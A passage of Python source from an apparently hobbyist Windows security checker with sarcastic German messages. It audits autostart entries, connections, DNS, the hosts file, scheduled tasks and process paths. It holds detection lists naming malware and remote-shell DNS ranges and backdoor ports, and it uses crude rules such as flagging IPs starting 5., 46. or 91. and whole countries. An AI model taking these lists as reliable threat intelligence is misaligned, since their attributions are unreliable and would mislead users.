                exe_path = cmd.strip('"').split(" ")[0]

            exe_norm = os.path.normcase(
                os.path.normpath(
                    os.path.expandvars(exe_path)
                )
            )
            entries.append((name, exe_norm, hive == winreg.HKEY_CURRENT_USER))

        winreg.CloseKey(key)

    # 3. Keine Einträge?
    if not entries:
        print("Sven sagt: Kein Autostart-Müll gefunden. Selten genug.")
        return

    # 4. Bewertung und Ausgabe
    print("Sven sagt: Hier die Autostart-VIPs:\n")
    for name, exe_norm, is_user in entries:
        quelle = "Benutzer" if is_user else "System"
        exists = os.path.exists(exe_norm)
        file_name = os.path.basename(exe_norm).lower()
        in_leiche = file_name in autostart_leichen_whitelist

        if exists:
            status = "✅ OK"
            warnung = ""
        elif in_leiche:
            status = "❌ fehlt"
            warnung = " 🟡 Ehemals installiert, jetzt wohl deinstalliert – vermutlich harmlos."
        else:
            status = "❌ fehlt"
            warnung = " ⚠️ Verdächtig! Unbekannt und verschwunden – prüfen!"

        print(f"Sven sagt: ⚙️ [{quelle}] {name}\n    → {exe_norm} {status}{warnung}")

        # 5. Optional: Hinweis zur manuellen Bereinigung
        if not exists and in_leiche:
            print(" ➤ Hinweis: Dies ist ein veralteter Autostart-Eintrag. Du kannst ihn manuell aus der Registry entfernen.")

def check_verbindungen():
    print("\nSven sagt: Ich schnüffel an deinen Netzwerkverbindungen...")
    total = suspicious = 0

    for conn in psutil.net_connections(kind='inet'):
        try:
            if conn.status != 'ESTABLISHED' or not conn.raddr:
                continue

            ip, port = conn.raddr.ip, conn.raddr.port
            if ":" in ip:  # IPv6 überspringen
                continue

            total += 1

            # Hostname
            try:
                host = socket.gethostbyaddr(ip)[0]
            except socket.herror:
                host = None

            print(f"\n🔎 Verbindung zu {ip}:{port}")
            if host:
                print(f"🧠 Hostname: {host}")

            # Prozess
            try:
                proc = psutil.Process(conn.pid)
                print(f"🔍 Prozess: {proc.name()} (PID {conn.pid})")
            except Exception:
                pass

            # Bewertung
            if ip.startswith(("5.", "46.", "91.")):
                suspicious += 1
                print(f"Sven sagt: ❗ Verdächtige Verbindung – Spionage? Einfach mal fragen.")
            else:
                print(f"Sven sagt: Verbindung vermutlich harmlos.")

        except (psutil.AccessDenied, psutil.ZombieProcess):
            continue

    print(f"\nSven sagt: Insgesamt {total} Verbindungen, davon {suspicious} auffällig.")

def check_systemzeit():
    """Prüft, ob deine Systemzeit plausibel ist, und überwacht den Windows-Zeitdienst."""
    # Aktuelle Zeit und Boot-Zeit holen
    now = datetime.datetime.now()
    boot_timestamp = psutil.boot_time()
    boot = datetime.datetime.fromtimestamp(boot_timestamp)

    # 1. Zeitreise-Check
    # Wenn der Boot-Zeitpunkt mehr als 5 Sekunden in der Zukunft liegt, stimmt die Uhr nicht
    if boot > now + datetime.timedelta(seconds=5):
        print("Sven sagt: ⏱️ Zeitreise erkannt! Dein Systemstart liegt in der Zukunft.")
        print("Sven sagt: Malware? Oder Einstein? Ich tippe auf ersteres.")
    else:
        uptime = now - boot
        # Sekundenanteil abschneiden
        up_str = str(uptime).split('.')[0]
        print(f"Sven sagt: Zeit sieht normal aus. Uptime: {up_str}")

    # 2. Zeitdienst-Check (w32time)
    try:
        out = subprocess.check_output("sc query w32time", shell=True, text=True)
        if "RUNNING" in out:
            print("Sven sagt: Windows-Zeitdienst (w32time) läuft – deine Uhren bleiben synchron.")
        else:
            print("Sven sagt: ⚠️ Windows-Zeitdienst (w32time) läuft nicht – das kann zu Zertifikatsfehlern führen.")
    except subprocess.CalledProcessError:
        print("Sven sagt: ❓ Konnte Zeitdienststatus nicht prüfen – vielleicht fehlen Rechte?")
    except Exception as e:
        print("Sven sagt: ❓ Unerwarteter Fehler beim Zeitdienst-Check:", e)

def check_dns_server():
    print("\n[Sven prüft deinen DNS-Server... doppelt, hart und schonungslos]")
    dns_server = set()

    # DNS-Provider-Erkennungsdatenbank
    bekannte_dns = {
        "8.8.": "Google DNS",
        "1.1.": "Cloudflare",
        "9.9.": "Quad9",
        "94.140.": "AdGuard DNS",
        "76.76.": "NextDNS",
        "45.90.": "NextDNS",
        "208.67.": "OpenDNS",
        "185.228.": "CleanBrowsing",
        "64.6.": "Verisign DNS",
        "156.154.": "Neustar DNS",
        "198.101.": "DNS.Watch",
        "176.103.": "AdGuard",
        "77.88.": "Yandex DNS",
        "114.114.": "114DNS (China)",
        "223.5.5.": "AliDNS (Alibaba)",
        "195.46.39.": "SafeDNS",
        "176.56.236.": "Comodo Secure DNS",
        "91.239.100.": "UncensoredDNS (DK)",
        "89.233.43.": "UncensoredDNS (2)",
        "8.26.56.": "Comodo Secure DNS (alt)",
        "199.85.126.": "Norton ConnectSafe (alt)",
        "156.154.70.": "Neustar UltraDNS (Security)",
        "156.154.71.": "Neustar UltraDNS (Security)",
        "185.213.26.": "deSEC DNS (privacy-focused)",
        "76.223.122.": "Amazon DNS (AWS resolver)",
        "205.171.3.": "Sprintlink DNS",
        "37.235.1.": "FreeDNS",
        "45.11.45.": "ControlD (modular DNS)",
        "94.16.114.": "Alternate DNS",
        "38.132.106.": "Libredns.gr – Privacy DNS"
    }

    böse_dns_prefixe = {
        "85.255.112.": "DNSChanger (Ukraine) – Malware-Netz",
        "85.255.113.": "DNSChanger Folge-Netz",
        "85.255.114.": "DNSChanger Folge-Netz",
        "77.220.182.": "DNSHijacking aus Russland – Phishing",
        "93.188.160.": "GhostDNS Infrastruktur",
        "95.211.194.": "Botnetz-Kommunikation (C2-Relay via DNS)",
        "91.121.82.": "CoinMiner DNS-Umleitung (FR)",
        "185.82.216.": "Dynamic DNS abused by RATs (NL)",
        "62.210.188.": "Scareware-DNS aus Frankreich",
        "5.45.75.": "Fake DNS bei APT28-nahen Servern",
        "213.109.234.": "DNS-Redirect via kompromittierte Router",
        "185.165.171.": "HackingTeam DNS-Netz",
        "46.17.97.": "DNS für Keylogger & RemoteShells",
        "178.33.229.": "Malware-Fallback-DNS",
        "213.183.53.": "APT-C2 via DNS",
        "144.217.86.": "Phishing-Umleitung (Kanada)",
        "176.31.28.": "DNS-Sinkhole von Scam-Verteilern",
        "31.184.194.": "Malvertising & ExploitKit-DNS",
        "109.236.80.": "DNS für Command&Control",
        "213.192.1.": "DNS missbraucht von FakeAV-Kampagnen",
        "80.82.70.": "Rogue DNS für Scam-Weiterleitung",
        "203.131.222.": "Asiatischer DNS-C2 Traffic (APT32 Umfeld)",
        "103.27.124.": "Malware Dropper DNS aus Indien",
        "149.202.160.": "Crypto-Stealer DNS (FR)",
        "69.30.197.": "Spamhaus DNSBL / DNSHijack Abuse",
    }

    # Variante 1: netsh
    try:
        output = subprocess.check_output("netsh interface ip show config", shell=True, text=True)
        aktiver_dns = False

        for line in output.splitlines():
            line = line.strip()
            if "DNS-Server" in line or "Statically Configured DNS Servers" in line:
                aktiver_dns = True
                parts = line.split(":")
                if len(parts) > 1:
                    dns_server.add(parts[1].strip())
            elif aktiver_dns and line and not line.startswith(" "):
                aktiver_dns = False
            elif aktiver_dns and line:
                dns_server.add(line.strip())
    except Exception as e:
        print("Sven sagt: ❌ netsh-Auswertung gescheitert – vielleicht benutzt du ein Betriebssystem aus der Zukunft?")
        print(f"Technischer Fehler (für Masochisten): {e}")

    # Variante 2: PowerShell
    try:
        ps_output = subprocess.check_output(
            'powershell -Command "Get-DnsClientServerAddress | Select-Object -ExpandProperty ServerAddresses"',
            shell=True, text=True, stderr=subprocess.DEVNULL
        )
        for line in ps_output.splitlines():
            line = line.strip()
            if line:
                dns_server.add(line)
    except Exception:
        print("Sven sagt: PowerShell will deine DNS-Adressen nicht verraten. Verdächtig schweigsam.")

    if not dns_server:
        print("Sven sagt: Kein DNS-Server sichtbar. Du surfst offenbar mit Hoffnung und schwarzer Magie.")
        return

    # 1. Individuelle IP-Analyse
    for ip in sorted(dns_server):
        print(f"\nSven sagt: DNS-Server gefunden → {ip}")
        try:
            if not any(c.isdigit() for c in ip):
                continue

            clean_ip = ip.split('%')[0].strip()
            ip_obj = ipaddress.ip_address(clean_ip)

            if ip_obj.is_loopback:
                print("Sven sagt: ➤ Loopback-Adresse – läuft hier ein lokaler DNS-Proxy oder bastelst du?")
            elif ip_obj.is_private:
                print("Sven sagt: ➤ Lokaler DNS – vermutlich dein Router. Hoffentlich nicht 'FritzBox-auf-Russisch'.")
            else:
                anbieter = None
                for prefix, name in bekannte_dns.items():
                    if clean_ip.startswith(prefix):
                        anbieter = name
                        break

                if anbieter:
                    print(f"Sven sagt: ➤ DNS erkannt: {anbieter}. Wenn du das absichtlich so willst – fein. Wenn nicht: red Flag.")
                else:
                    print("Sven sagt: ⚠️ Öffentlich erreichbarer DNS außerhalb der bekannten Anbieter – wenn du den nicht selbst gesetzt hast: frag dich warum.")

            # Immer weiter prüfen auf "böse" Prefixe
            for prefix, beschreibung in böse_dns_prefixe.items():
                if clean_ip.startswith(prefix):
                    print(f"Sven sagt: 🚨 Verdächtiger DNS-Server – {beschreibung}")
                    print("Sven sagt: ➤ Sofort prüfen, ob du das absichtlich eingetragen hast. Wenn nicht: Alarm.")
                    break

            # Optional: Veraltete IPv6-Platzhalter hervorheben
            if ip_obj.version == 6 and clean_ip.startswith("fec0:"):
                print("Sven sagt: ⚠️ Veralteter IPv6-Platzhalter entdeckt – aus Windows XP/2000. Niemals sinnvoll in modernen Systemen.")

        except ValueError:
            print("Sven sagt: ⚠️ Kein gültiges IP-Format – das ist kein DNS, das ist ein Wunschtraum oder ein Fehler.")
            if "https://" in ip or "dot" in ip.lower():
                print("Sven sagt: ➤ Sieht nach DoH/DoT aus. Moderne Verschleierung oder verkorkste Konfiguration?")
            elif "localhost" in ip.lower():
                print("Sven sagt: ➤ Lokaler Test-DNS? Oder hast du 'localhost' in die Registry geschmuggelt?")
            else:
                print("Sven sagt: ➤ Das sieht aus wie DNS-Müll. Riecht nach Konfigurations-Fehler oder Manipulation.")

    # 2. Info-Feature: Nicht-Standard-DNS erkennen
    standard_dns_prefixe = {
        "8.8.": "Google DNS",
        "1.1.": "Cloudflare",
        "9.9.": "Quad9",
        "45.90.": "NextDNS",
        "208.67.": "OpenDNS",
        "192.168.": "Lokaler Router",
        "10.": "Lokaler DNS (intern)",
        "172.16.": "Lokaler DNS (intern)"
    }
    nicht_standard_dns = [ip for ip in dns_server if not any(ip.startswith(pref) for pref in standard_dns_prefixe)]
    if nicht_standard_dns:
        print(f"\nSven sagt: ⚠️ {len(nicht_standard_dns)} DNS-Adresse(n) außerhalb üblicher Anbieter entdeckt:")
        for ip in nicht_standard_dns:
            print(f" ➤ {ip} – prüfen, ob absichtlich gesetzt.")
    else:
        print("\nSven sagt: DNS-Konfiguration wirkt standardmäßig – alles normal.")

    print("\nSven sagt: DNS-Analyse abgeschlossen. Wenn dir was seltsam vorkommt: Kabel raus, Kaffee rein, recherchieren.")

def check_temp_ordner():
    print("\n[Sven checkt den Temp-Ordner... gründlich und gnadenlos]")

    temp_pfad = tempfile.gettempdir()
    dateien = 0
    gesamt_bytes = 0
    älteste = None
    älteste_zeit = time.time()
    größte = None
    größte_bytes = 0
    dateiendungen = Counter()
    löschbare_dateien = []

    for wurzel, ordner, dateiliste in os.walk(temp_pfad):
        for datei in dateiliste:
            try:
                pfad = os.path.join(wurzel, datei)
                größe = os.path.getsize(pfad)
                mtime = os.path.getmtime(pfad)

                gesamt_bytes += größe
                dateien += 1

                if mtime < älteste_zeit:
                    älteste_zeit = mtime
                    älteste = pfad

                if größe > größte_bytes:
                    größte_bytes = größe
                    größte = pfad

                ext = os.path.splitext(datei)[1].lower()
                if ext:
                    dateiendungen[ext] += 1

                löschbare_dateien.append(pfad)

            except (PermissionError, FileNotFoundError):
                continue

    gesamt_mb = gesamt_bytes / (1024 * 1024)

    print(f"Sven sagt: Der Temp-Ordner enthält {dateien} Dateien mit insgesamt {gesamt_mb:.1f} MB.")

    # Bewertung
    if dateien == 0:
        print("Sven sagt: Nichts da. So sauber ist sonst nur ein frisches Windows nach der Taufe.")
    elif gesamt_mb < 100:
        print("Sven sagt: Das ist noch harmlos. Aber man muss ja nicht alles ewig behalten.")
    elif gesamt_mb < 500:
        print("Sven sagt: Das ist schon ein ordentlicher Haufen digitaler Müll.")
    elif gesamt_mb < 2000:
        print("Sven sagt: Dein Temp-Ordner ist schwerer als dein Gewissen nach der Steuererklärung.")
    else:
        print("Sven sagt: Beeindruckend. Du könntest mit diesem Datenmüll ein Backup vom Mond beschweren.")
        print("Sven sagt: Kein Wunder, wenn dein PC schnauft wie ein 20 Jahre alter Staubsauger.")

    if älteste:
        zeit = datetime.datetime.fromtimestamp(älteste_zeit).strftime('%Y-%m-%d %H:%M:%S')
        print(f"Sven sagt: Älteste Datei: {älteste} (letzte Änderung: {zeit})")

    if größte:
        print(f"Sven sagt: Größte Datei: {größte} ({größte_bytes / (1024*1024):.1f} MB)")

    if dateiendungen:
        print("Sven sagt: Meiste Dateitypen im Temp-Ordner:")
        for endung, anzahl in dateiendungen.most_common(5):
            print(f" → {endung or '[keine Endung]'}: {anzahl} Dateien")

    if dateien > 1000:
        print("Sven sagt: ⚠️ Über 1000 Dateien im Temp? Da gammelt was richtig rein. Update-Leichen oder schlimmer?")

    # Lösch-Vorbereitung (aber noch nicht löschen!)
    if löschbare_dateien:
        print("\n[Vorbereitung zur manuellen Bereinigung des Temp-Ordners]")
        print("Erklärung für Menschen ohne IT-Hintergrund:")
        print("- Der 'Temp'-Ordner enthält temporäre Dateien, die von Programmen während ihrer Ausführung erstellt werden.")
        print("- Diese Dateien bleiben oft zurück, obwohl sie nicht mehr gebraucht werden.")
        print("- Die Bereinigung entfernt überflüssige Dateien und kann Speicherplatz freigeben.")
        print("- Wichtige Programme oder Windows selbst werden dadurch **nicht beschädigt**, solange man nur im Temp löscht.")
        print("\nDie folgenden Dateien wären theoretisch löschbar (nur Vorschau):")
        for pfad in löschbare_dateien[:10]:
            print(f" → {pfad}")
        if len(löschbare_dateien) > 10:
            print(f"...und {len(löschbare_dateien) - 10} weitere.")

    print("\nSven sagt: Aufräumen? Noch manuell – aber denk drüber nach.")

    # Optional: Temp-Ordner im Explorer öffnen
    try:
        print("\nSven sagt: Ich öffne dir den Temp-Ordner. Reinsehen, auswählen, löschen.")
        subprocess.Popen(f'explorer "{temp_pfad}"')
    except Exception as e:
        print(f"Sven sagt: ❌ Konnte Temp-Ordner nicht öffnen: {e}")

def check_hosts_datei():
    print("\n[Sven schnüffelt in deiner Hosts-Datei herum...]")
    pfad = r"C:\Windows\System32\drivers\etc\hosts"

    kritische_stichworte = ["google", "bank", "paypal", "microsoft", "amazon", "login"]
    redirect_ips = {"127.0.0.1", "0.0.0.0", "::1"}

    try:
        with open(pfad, "r", encoding="utf-8", errors="replace") as f:
            zeilen = f.readlines()

        einträge = []
        for zeile in zeilen:
            z = zeile.strip()
            if z and not z.startswith("#"):
                einträge.append(z)

        if not einträge:
            print("Sven sagt: Deine Hosts-Datei ist sauber. So leer wie das WLAN in der Wildnis.")
            return

        print("Sven sagt: Achtung – es gibt Einträge in der Hosts-Datei!")
        print("Sven sagt: Diese Datei kann Webseiten umleiten oder blockieren.")
        print("Sven sagt: Das ist wie eine Adressliste fürs Internet – aber mit Tipp-Ex.")

        verdächtig = False
        for eintrag in einträge:
            print(f"➡️  {eintrag}")
            teile = eintrag.split()

            if len(teile) < 2:
                print("⚠️  Sven sagt: Diese Zeile ist unvollständig oder defekt.")
                continue

            ip, ziel = teile[0], teile[1].lower()

            if ip in redirect_ips:
                print("Sven sagt: ➤ Umleitung auf localhost – kann Adblock sein, aber auch Täuschung.")
            if any(kw in ziel for kw in kritische_stichworte):
                print(f"⚠️  Sven sagt: Verdächtige Domain-Umleitung erkannt: '{ziel}'")
                verdächtig = True

        if verdächtig:
            print("⚠️  Sven sagt: Diese Hosts-Datei riecht nach Manipulation. Weiter prüfen!")
        elif len(einträge) > 100:
            print("Sven sagt: ⚠️ Das ist eine ganze Adblock-Armee – oder du hast Malware blockiert. Oder installiert.")
        elif len(einträge) > 10:
            print("Sven sagt: Das ist mehr als üblich. Vielleicht mal prüfen, woher diese Liste stammt.")

    except PermissionError:
        print("Sven sagt: Ich darf nicht auf die Hosts-Datei zugreifen. Du musst mich als Admin starten – oder habt ihr was zu verbergen?")
    except Exception as e:
        print("Sven sagt: Die Hosts-Datei hat sich geweigert, mit mir zu sprechen.")
        print(f"Sven sagt: Technischer Fehler (falls es dich interessiert): {e}")

def check_geplante_aufgaben():
    print("\n[Sven schaut in deine geplanten Aufgaben – die du nie selbst angelegt hast...]")

    try:
        try:
            output = subprocess.check_output("schtasks /query /fo LIST /v", shell=True, text=True, encoding="mbcs")
        except UnicodeDecodeError:
            output = subprocess.check_output("schtasks /query /fo LIST /v", shell=True, text=True, encoding="utf-8", errors="ignore")

        einträge = output.split("\n\n")
        verdächtig = []

        for block in einträge:
            if not block.strip():
                continue
            eintrag = {}
            for zeile in block.splitlines():
                if ":" in zeile:
                    k, v = zeile.split(":", 1)
                    eintrag[k.strip()] = v.strip()

            pfad = eintrag.get("Task To Run", "") or eintrag.get("Auszuführende Aufgabe", "") or eintrag.get("Feladat futtatása", "")
            name = eintrag.get("TaskName", "") or eintrag.get("Aufgabenname", "") or eintrag.get("Feladat neve", "")
            trigger = eintrag.get("Schedule Type", "") or eintrag.get("Zeitplan-Typ", "") or eintrag.get("Ütemezés típusa", "")
            autor = eintrag.get("Author", "") or eintrag.get("Autor", "") or eintrag.get("Szerző", "")
            last_run = eintrag.get("Last Run Time", "") or eintrag.get("Letzter Lauf", "") or eintrag.get("Utoljára futtatva", "")
            next_run = eintrag.get("Next Run Time", "") or eintrag.get("Nächster Lauf", "") or eintrag.get("Következő futtatás", "")
            status = eintrag.get("Status", "") or eintrag.get("Status", "") or eintrag.get("Állapot", "")

            if pfad:
                print(f"\n🗓️ Aufgabe: {name}")
                print(f"➡️  Wird gestartet: {pfad}")
                if autor:
                    print(f"👤 Erstellt von: {autor}")
                if trigger:
                    print(f"⏱️ Zeitplan: {trigger}")
                if last_run:
                    print(f"📅 Letzter Lauf: {last_run}")
                if next_run:
                    print(f"📆 Nächster geplanter Lauf: {next_run}")
                if status:
                    print(f"📌 Status: {status}")

                # Bewertung für Boomer: einfache Erklärung
                print("Erklärung: Geplante Aufgaben starten Programme automatisch – z. B. beim Systemstart oder zu festen Zeiten. Das ist normal für Updates, kann aber auch für Spionage oder Schadsoftware genutzt werden.")

                # Verdächtigkeitslogik
                kritische_trigger = [
                    "At logon", "Beim Anmelden", "Bei Anmeldung", "Logon",
                    "At startup", "Beim Systemstart", "Systemstart", "Startup",
                    "Bejelentkezéskor", "Rendszerindításkor"
                ]

                if any(t in trigger for t in kritische_trigger):
                    print("⚠️  Sven sagt: Wird direkt beim Start oder Login ausgeführt – unbedingt prüfen.")

                kritische_endungen = (".ps1", ".vbs", ".bat", ".js", ".cmd", ".hta", ".exe")
                if pfad.lower().endswith(kritische_endungen) and not pfad.lower().startswith(("c:\\windows", "c:\\program files")):
                    if name not in verdächtig:
                        verdächtig.append(name)
                    print("⚠️  Sven sagt: Skript/Programm mit fragwürdiger Herkunft – potenziell gefährlich.")

                if any(x in pfad.lower() for x in ["appdata", "temp", "powershell"]):
                    if name not in verdächtig:
                        verdächtig.append(name)
                    print("⚠️  Sven sagt: Das sieht nicht vertrauenswürdig aus. Wer plant sowas freiwillig ein?")

                täuschende_namen = ["chrome", "update", "system", "adobe", "onedrive", "helper", "service"]
                if any(n in name.lower() for n in täuschende_namen):
                    print("⚠️  Sven sagt: Der Name klingt... vertraut. Zu vertraut.")

        if not einträge or all(not e.strip() for e in einträge):
            print("\nSven sagt: Keine Aufgaben gefunden. Entweder bist du übervorsichtig – oder jemand sehr gründlich.")
        elif not verdächtig:
            print("\nSven sagt: Alle Aufgaben sehen unauffällig aus. Aber ich habe ein Auge drauf – wie immer.")
        else:
            print(f"\nSven sagt: {len(verdächtig)} verdächtige Aufgabe(n) gefunden. Wenn du die nicht kennst – Zeit für Kaffee und Recherchieren.")

    except subprocess.CalledProcessError:
        print("Sven sagt: Ich kann die Aufgabenliste nicht abrufen. Vielleicht verweigert der Aufgabenplaner gerade die Aussage.")
    except Exception as e:
        print("Sven sagt: Da ging was schief beim Lesen der Aufgaben.")
        print(f"Sven sagt: Technischer Grund: {e}")

def check_verbindungen_mit_geoip():
    print("\n[Svenbot: Aktive Verbindungen – GeoIP-Analyse mit GeoLite2 (lokal, keine Cloud!)]\n")
    db_path = "GeoLite2-City.mmdb"
    sensitive_countries = {"Russia", "China", "Iran", "North Korea", "Belarus"}
    cloud_keywords = ["amazon", "aws", "microsoft", "azure", "google", "gcp", "cloudflare", "digitalocean", "oracle", "ovh", "alibaba", "linode", "hetzner"]
    kritische_ports = {1337, 4444, 3389, 9001, 8080}
    verdächtig_gesamt = 0

    if not os.path.exists(db_path):
        print("Sven sagt: GeoIP-Datenbank nicht gefunden! Lege 'GeoLite2-City.mmdb' ins Svenbot-Verzeichnis.")
        return

    try:
        reader = geoip2.database.Reader(db_path)
    except Exception as e:
        print(f"Sven sagt: Fehler beim Laden der GeoIP-Datenbank: {e}")
        return

    verbindungen = psutil.net_connections(kind='inet')
    aktive = [v for v in verbindungen if v.status == 'ESTABLISHED' and v.raddr]
    if not aktive:
        print("Sven sagt: Keine aktiven Verbindungen. Entweder dein PC ist brav – oder verschlüsselt gerade alles clever.")
        return

    checked = set()
    for v in aktive:
        ip = v.raddr.ip
        port = v.raddr.port
        pid = v.pid

        # IPv6 überspringen
        if ":" in ip:
            print(f"\n🔧 IPv6-Verbindung zu {ip}:{port} – wird aktuell nicht bewertet.")
            continue

        # IP bereinigen (ZoneID entfernen)
        clean_ip = ip.split('%')[0].strip()
        ip_obj = ipaddress.ip_address(clean_ip)

        print(f"\n🔎 Verbindung zu {clean_ip}:{port}")

        # Hostname ermitteln
        try:
            hostname = socket.gethostbyaddr(clean_ip)[0]
            print(f"🧠 Hostname: {hostname}")
        except Exception:
            hostname = None

        # Prozessinfos
        try:
            proc  = psutil.Process(pid)
            pname = proc.name()
            cmd   = " ".join(proc.cmdline()) or "Keine Details"
            print(f"🔍 Prozess: {pname} (PID {pid})\n    Befehl: {cmd}")
        except Exception:
            print("🔍 Prozess: nicht ermittelbar – ggf. kurzlebige oder systeminterne Verbindung.")

        # Loopback / Private
        if ip_obj.is_loopback:
            print("➤ Loopback – lokale Kommunikation.")
            continue
        if ip_obj.is_private:
            print("➤ Privates Netz – normal.")
            continue

        # GeoIP-Analyse (lokal!)
        try:
            info = reader.city(clean_ip)
            country = info.country.name or "?"
            city = info.city.name or "?"
            org = (info.traits.organization or "") if hasattr(info.traits, "organization") else ""
            isp = (info.traits.isp or "") if hasattr(info.traits, "isp") else ""
            out = f"🌍 Geo: {country}, {city}".strip(", ")
            cloud_hint = ""
            # Cloud-Check
            if org:
                if any(cw in org.lower() for cw in cloud_keywords):
                    cloud_hint = f"🌐 Cloud/Hosting: {org}"
            elif isp:
                if any(cw in isp.lower() for cw in cloud_keywords):
                    cloud_hint = f"🌐 Cloud/ISP: {isp}"
            # Output mit Land und ggf. Cloud-Hinweis
            print(out)
            if cloud_hint:
                print(cloud_hint)
            # Alarm bei "sensitive countries"
            if country in sensitive_countries:
                print(f"🚨 Achtung: Verbindung zu {country} (bekannte C2/Angreifer-Länder)!")
                verdächtig_gesamt += 1
            elif country == "?":
                print("❗ Herkunft unbekannt – IP nicht zuordenbar.")
            else:
                print("✅ Verbindung sieht nach normalem Land aus.")
        except Exception as e:
            print(f"❗ GeoIP nicht möglich ({e}) – evtl. sehr neue oder ungewöhnliche IP.")

        # Port-Check
        if port in kritische_ports:
            print(f"⚠️ Port {port} bekannt für Missbrauch (RDP, Backdoor etc.).")

    print(f"\nSven sagt: Verbindungen geprüft. {verdächtig_gesamt} kritische Zielregion(en) entdeckt.")
    print("Wenn dir was komisch vorkommt – LAN-Kabel raus, Kaffee rein, recherchieren.\n")

def check_dll_injection_ziele():
    print("\n[Sven analysiert die geladenen DLLs – woher kommen die Bausteine deiner Programme?]")

    ziele = ["explorer.exe", "svchost.exe", "chrome.exe", "winlogon.exe"]
    auffällige_dlls = []

    for proc in psutil.process_iter(['name', 'pid']):
        try:
            name = proc.info['name'].lower()
            if name not in ziele:
                continue

            gesehene_dlls = set()  # für Dedup

            for dll in proc.memory_maps():
                pfad = dll.path.lower()
                if not pfad.endswith(".dll"):
                    continue

                if pfad in gesehene_dlls:
                    continue  # schon gemeldet
                gesehene_dlls.add(pfad)

                # Whitelist prüfen
                if "translucenttb" in pfad or "python\\launcher" in pfad:
                    continue

                # Verdächtige Pfadbestandteile
                if any(böse in pfad for böse in [
                    "appdata", "temp", "downloads",
                    "\\users\\", "\\programdata\\",
                    "\\roaming\\", "\\local\\"
                ]):
                    auffällige_dlls.append((name, pfad))

        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue

    if auffällige_dlls:
        print("Sven sagt: ❗ Unerwartete DLLs in wichtigen Prozessen gefunden!")
        for name, pfad in auffällige_dlls:
            print(f"⚠️  {name} lädt DLL aus verdächtigem Pfad: {pfad}")
        print("Sven sagt: Entweder du bist kreativ – oder dein System ist kompromittiert. Check das.")
    else:
        print("Sven sagt: Alle wichtigen Prozesse verwenden nur brave DLLs. Keine unerwarteten Gäste entdeckt.")

def check_fake_prozesspfade(sprache="de", aggressiv=True):
    # Nachrichten auf Deutsch und Ungarisch
    texts = {
        "de": {
            "intro": "\n[Sven prüft, ob bekannte Prozesse an seltsamen Orten auftauchen...]",
            "no_fake": "Sven sagt: Alle bekannten Prozesse stammen von ihrem echten Wohnsitz. Keine Klone gefunden – fürs Erste.",
            "summary": "Sven sagt: Insgesamt {count} verdächtige Prozesse entdeckt: {names}.",
            "symlink": "⚠️  {name} scheint ein Symlink/Junction zu sein – genauer prüfen: {pfad}",
            "fake": "⚠️  {name} (PID {pid}) läuft von: {pfad} – gestartet um {startzeit}",
        },
        "hu": {
            "intro": "\n[Sven ellenőrzi, hogy ismerős folyamatok gyanús helyről indulnak-e...]",
            "no_fake": "Sven mondja: Minden ismert folyamat valódi helyéről fut. Nincs klón – egyelőre.",
            "summary": "Sven mondja: Összesen {count} gyanús folyamat található: {names}.",
            "symlink": "⚠️  {name} szimbolikus hivatkozásnak/junctionnak tűnik – ellenőrizd: {pfad}",
            "fake": "⚠️  {name} (PID {pid}) innen fusson: {pfad} – indítás ideje {startzeit}",
        }
    }
    txt = texts.get(sprache, texts["de"])
    print(txt["intro"])

    # Rohdaten der legitimen Prozesse (Keys in lowercase)
    legitime_prozesse = {
        "chrome.exe":      [r"%ProgramFiles%\Google", r"%ProgramFiles(x86)%\Google"],
        "firefox.exe":     [r"%ProgramFiles%\Mozilla Firefox"],
        "msedge.exe":      [r"%ProgramFiles%\Microsoft", r"%ProgramFiles(x86)%\Microsoft"],
        "svchost.exe":     [r"%SystemRoot%\System32"],
        "lsass.exe":       [r"%SystemRoot%\System32"],
        "services.exe":    [r"%SystemRoot%\System32"],
        "winlogon.exe":    [r"%SystemRoot%\System32"],
        "explorer.exe":    [r"%SystemRoot%"],
        "wininit.exe":     [r"%SystemRoot%\System32"],
        "taskhostw.exe":   [r"%SystemRoot%\System32"],
        "powershell.exe":  [r"%SystemRoot%\System32\WindowsPowerShell", r"%SystemRoot%\System32\WindowsPowerShell\v1.0"],
        "dwm.exe":         [r"%SystemRoot%\System32"],
        "csrss.exe":       [r"%SystemRoot%\System32"],
        "smss.exe":        [r"%SystemRoot%\System32"],
        "spoolsv.exe":     [r"%SystemRoot%\System32"],                  # aktualisiert!
        "lsm.exe":         [r"%SystemRoot%\System32"],
        "wuauserv.exe":    [r"%SystemRoot%\System32"],
        "audiodg.exe":     [r"%SystemRoot%\System32"],
        "wermgr.exe":      [r"%SystemRoot%\System32"],
        "taskeng.exe":     [r"%SystemRoot%\System32\Tasks"],
        "dcomlaunch.exe":  [r"%SystemRoot%\System32"],
        "fontdrvhost.exe": [r"%SystemRoot%\System32"],
        "sgrm.exe":        [r"%SystemRoot%\System32"],
    }

    # Vorberechnung: expandvars + normalize
    norm_legit = {
        name: [os.path.normcase(os.path.normpath(os.path.expandvars(p))) for p in paths]
        for name, paths in legitime_prozesse.items()
    }

    gefunden = []
    for proc in psutil.process_iter(['pid', 'name', 'exe', 'create_time']):
        try:
            name = proc.info['name']
            key = name.lower()
            pid = proc.info['pid']
            exe = proc.info.get('exe')
            if not exe or key not in norm_legit:
                continue

            # Pfad normalisieren
            pfad = os.path.normcase(os.path.normpath(os.path.expandvars(exe)))

            # Symlink/Junction-Erkennung
            try:
                if ctypes.windll.kernel32.GetFileAttributesW(pfad) & 0x400:
                    msg = txt['symlink'].format(name=name, pfad=pfad)
                    print(msg)
            except OSError:
                pass

            # Legitimer Pfad-Check mit optionaler Basename-Prüfung
            prefix_match    = any(pfad.startswith(e) for e in norm_legit[key])
            basename_match  = os.path.basename(pfad).lower() == key
            if prefix_match and basename_match:
                continue  # korrekt – überspringen

            # Wenn kein Match auf legitime Pfade, als verdächtig melden
            startzeit = datetime.datetime.fromtimestamp(proc.info['create_time']).strftime("%Y-%m-%d %H:%M:%S")
            msg = txt['fake'].format(name=name, pid=pid, pfad=pfad, startzeit=startzeit)
            print(msg)
            gefunden.append(name)

        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue

    # Zusammenfassung
    if gefunden:
        names = ", ".join(sorted(set(gefunden)))
        print(txt['summary'].format(count=len(gefunden), names=names))
    else:
        print(txt['no_fake'])

def check_treiber_signaturen():
    """
    Prüft alle aktuell geladenen Windows-Treiber auf Pfad und digitale Signatur.
    Ignoriert bekannte Microsoft-Systemtreiber und prüft nur existierende Dateien.
    Sarkastische Kommentare inklusive.
    """
